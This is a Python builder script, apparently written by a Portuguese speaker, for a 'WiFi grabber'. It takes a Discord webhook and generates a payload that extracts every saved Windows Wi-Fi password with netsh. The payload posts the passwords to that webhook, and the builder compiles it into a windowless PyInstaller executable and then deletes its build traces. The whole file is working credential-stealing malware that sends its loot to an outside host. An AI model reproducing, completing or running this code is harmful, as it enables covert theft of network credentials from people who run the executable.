import os
import sys
import time
import subprocess
import shutil

def build_wifigrabber():
    print("="*50)
    print("WIFI GRABBER BUILDER")
    print("="*50)
    
    webhook = input("Digite o Webhook do Discord: ").strip()
    
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print("Webhook inválido!")
        return
    
    wifi_script = f'''
import subprocess
import re
import requests
import time

WEBHOOK_URL = "{webhook}"

def get_wifi_profiles():
    profiles = []
    try:
        output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, encoding='utf-8', timeout=10)
        profiles = re.findall(r"All User Profile     : (.*)", output)
    except Exception as e:
        return [f"Erro ao obter perfis: {{e}}"]
    return profiles

def get_wifi_password(profile):
    try:
        output = subprocess.check_output(f'netsh wlan show profile name="{{profile}}" key=clear', shell=True, text=True, encoding='utf-8', timeout=10)
        password_search = re.search(r"Key Content            : (.*)", output)
        if password_search:
            return password_search.group(1)
        else:
            return "(Sem senha encontrada)"
    except Exception as e:
        return f"Erro: {{e}}"

def send_to_webhook(content):
    content = content[:1900] if len(content) > 1900 else content
    embed = {{
        "title": "Wifi Password Grabber",
        "description": content,
        "color": 0x0000FF,
        "footer": {{"text": "Enviado em " + time.strftime("%Y-%m-%d %H:%M:%S")}}
    }}
    data = {{"embeds": [embed]}}
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

if __name__ == "__main__":
    profiles = get_wifi_profiles()
    if isinstance(profiles, list) and profiles and not profiles[0].startswith("Erro"):
        message = ""
        for profile in profiles:
            pwd = get_wifi_password(profile)
            message += f"**{{profile}}** : `{{pwd}}`\\n"
    else:
        message = "\\n".join(profiles)
    send_to_webhook(message)
'''

    script_path = "wifigrabber.py"
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(wifi_script)
    
    print("Compilando...")
    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--noconfirm", script_path], check=True)
        
        downloads = os.path.join(os.path.expanduser("~"), "Downloads")
        final_path = os.path.join(downloads, "wifigrabber.exe")
        
        if os.path.exists(os.path.join("dist", "wifigrabber.exe")):
            shutil.move(os.path.join("dist", "wifigrabber.exe"), final_path)
            print(f"WiFi Grabber criado: {final_path}")
    except Exception as e:
        print(f"Erro: {e}")
    
    # Limpeza
    for folder in ["build", "dist", "__pycache__"]:
        shutil.rmtree(folder, ignore_errors=True)
    for file in ["wifigrabber.py", "wifigrabber.spec"]:
        os.remove(file)

if __name__ == "__main__":
    build_wifigrabber()